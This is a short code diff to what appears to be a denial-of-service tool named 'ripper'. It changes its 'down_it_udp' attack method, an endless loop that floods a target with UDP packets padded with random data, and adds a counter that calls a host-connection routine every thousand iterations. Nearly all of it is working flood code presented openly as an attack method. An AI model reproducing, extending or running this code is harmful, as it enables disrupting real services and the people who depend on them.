@@ -2,6 +2,7 @@ import socket
 import random
 import urllib.request
 from os import urandom as randbytes
+import ripper.services
 from ripper.context import Context
 from ripper.statistics import show_statistics
 from ripper.common import get_random_string, get_server_ip_error_msg
@@ -11,6 +12,7 @@ from ripper.common import get_random_string, get_server_ip_error_msg
 # Attack methods
 ###############################################
 def down_it_udp(_ctx: Context):
+    i = 1
     while True:
         sock = _ctx.sock_manager.get_udp_socket()
         extra_data = get_random_string(1, _ctx.max_random_packet_len) if _ctx.random_packet_len else ''
@@ -31,6 +33,11 @@ def down_it_udp(_ctx: Context):
             if get_server_ip_error_msg in _ctx.errors:
                 _ctx.errors.remove(str(get_server_ip_error_msg))
             _ctx.packets_sent += 1
+
+        i += 1
+        if i == 1000 and not _ctx.connecting_host:
+            i = 1
+            ripper.services.connect_host(_ctx)
 
         if not _ctx.show_statistics:
             show_statistics(_ctx)
